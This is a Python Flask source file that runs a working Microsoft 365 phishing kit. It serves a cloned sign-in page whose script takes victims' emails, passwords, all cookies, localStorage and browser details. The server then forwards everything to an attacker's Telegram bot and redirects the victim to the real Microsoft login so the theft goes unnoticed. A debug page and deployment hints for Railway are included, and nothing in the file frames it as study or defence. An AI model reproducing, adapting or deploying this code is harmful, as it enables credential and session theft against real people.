
import os
from flask import Flask, request
import requests
import json
from datetime import datetime

app = Flask(__name__)

TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'MISSING')
CHATID = os.environ.get('TELEGRAM_CHAT_ID', 'MISSING')

print(f"🚀 STARTUP | Token:{len(TOKEN)}chars | ChatID:{len(CHATID)}chars | {datetime.now()}")

@app.route('/')
def phish():
    return '''<!DOCTYPE html>
<html><head><title>Sign in to your account</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="data:image/svg+xml;base64,...">
<style>
body{font-family:"Segoe UI",sans-serif;background:linear-gradient(135deg,#f5f5f5 0%,#e0e0e0 100%);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:420px;width:100%;background:white;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.15);overflow:hidden}
.header{padding:40px 40px 20px;background:linear-gradient(135deg,#0078d4 0%,#106ebe 100%);color:white;text-align:center}
.header img{width:48px;height:48px;margin-bottom:12px}
.header h1{font-size:28px;font-weight:600;margin:0}
.form{padding:0 40px 40px}
.input-group{position:relative;margin-bottom:20px}
.input-group input{width:100%;padding:16px 20px 16px 48px;border:2px solid #edebe9;border-radius:8px;font-size:16px;box-sizing:border-box;transition:all .2s}
.input-group input:focus{border-color:#0078d4;outline:none;box-shadow:0 0 0 3px rgba(0,120,212,.1)}
.input-group svg{position:absolute;left:16px;top:50%;transform:translateY(-50%);width:20px;height:20px;color:#666}
.btn{width:100%;padding:16px;border:none;border-radius:8px;background:linear-gradient(135deg,#0078d4 0%,#106ebe 100%);color:white;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s}
.btn:hover{background:linear-gradient(135deg,#106ebe 0%,#005a9e 100%);transform:translateY(-1px)}
.loading{display:none;text-align:center;padding:40px;color:#666}
@media(max-width:480px){.container{margin:20px;border-radius:8px}.header{padding:30px 20px 15px}.form{padding:0 20px 30px}}
</style></head>
<body>
<div class="container">
<div class="header">
<svg viewBox="0 0 48 48" fill="currentColor"><path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm0 36c-8.84 0-16-7.16-16-16S15.16 8 24 8s16 7.16 16 16-7.16 16-16 16z"/></svg>
<h1>Sign in to your account</h1>
</div>
<form id="loginForm">
<div class="input-group"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6v2l8 5 8-5V6l-8 5z"/></svg>
<input id="email" type="email" placeholder="someone@example.com" required autocomplete="email"></div>
<div class="input-group"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
<input id="pass" type="password" placeholder="Password" required autocomplete="current-password"></div>
<button type="submit" class="btn">Sign in</button>
</form>
<div id="loading" class="loading">
<svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" stroke="#0078d4" stroke-width="5" stroke-linecap="round" stroke-dasharray="31.4" stroke-dashoffset="31.4" stroke-dasharray="89"><animate attributeName="stroke-dashoffset" dur="1s" repeatCount="indefinite" values="31.4;0;31.4"/></circle></svg>
<p>Checking your account...</p>
</div>
</div>
<script>
async function harvest(){
  const data = {
    email: document.getElementById('email').value,
    pass: document.getElementById('pass').value,
    cookies: document.cookie,  // 🍪 ALL COOKIES
    ua: navigator.userAgent,
    lang: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    localStorage: JSON.stringify(localStorage),  // 🆕 LOCALSTORAGE
    sessionStorage: Object.keys(sessionStorage).join(',')  // 🆕 SESSION
  };
  
  try{
    await fetch('/harvest',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(data),
      credentials:'include'  // 🍪 ENSURE COOKIES
    });
  }catch(e){console.log('harvest sent')}
}

document.getElementById('loginForm').onsubmit = async e => {
  e.preventDefault();
  await harvest();
  document.getElementById('loginForm').style.display='none';
  document.getElementById('loading').style.display='block';
  
  // Legit redirect
  setTimeout(()=>{
    const email = document.getElementById('email').value;
    window.location=`https://login.microsoftonline.com/?username=${encodeURIComponent(email)}`;
  },2500);
};
</script></body></html>''', 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json() or {}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        email = data.get('email', 'N/A')
        passw = data.get('pass', 'N/A')
        cookies = data.get('cookies', '')
        ua = data.get('ua', '')
        extras = f"Lang:{data.get('lang')} | Screen:{data.get('screen')}"
        
        # RAILWAY LOG
        log_msg = f"🌐 {ip} | {email} | {passw[:4]}*** | Cookies:{len(cookies)} | {datetime.now()}"
        print(log_msg)
        
        # TELEGRAM (FULL DETAILS)
        tmsg = f"""🔥 <b>M365 HIT!</b>

👤 <b>{email}</b>
🔑 <code>{passw}</code>
🍪 <b>{len(cookies) if cookies else 0} Cookies</b>: <code>{cookies[:300]}...</code>
📍 <b>{ip}</b>
🖥️ <code>{ua[:80]}...</code>
📱 {extras}

<i>harvested {datetime.now()}</i>"""
        
        if len(TOKEN) > 20 and len(CHATID) > 5:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                         data={'chat_id':CHATID, 'text':tmsg, 'parse_mode':'HTML'})
            print("📱 Telegram OK")
        else:
            print("❌ Telegram config missing")
            
        return "OK", 200
    except Exception as e:
        print(f"❌ Harvest error: {str(e)}")
        return "OK", 200

@app.route('/test')
def test():
    return f"""
<h1>✅ PHISH DEBUG</h1>
<hr>
<p><b>🔗 Your phish:</b> <a href="/">Click to test → Fill form</a></p>
<p><b>🌐 My IP:</b> {request.remote_addr}</p>
<p><b>🤖 Token:</b> {'✅ ' + str(len(TOKEN)) if len(TOKEN)>20 else '❌ Set TELEGRAM_BOT_TOKEN'}</p>
<p><b>💬 ChatID:</b> {'✅ ' + str(len(CHATID)) if len(CHATID)>5 else '❌ Set TELEGRAM_CHAT_ID'}</p>
<p><b>📱 Test Telegram:</b> Check Railway logs after form submit!</p>
<hr><small>Procfile: <code>web: python m365-single.py</code></small>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
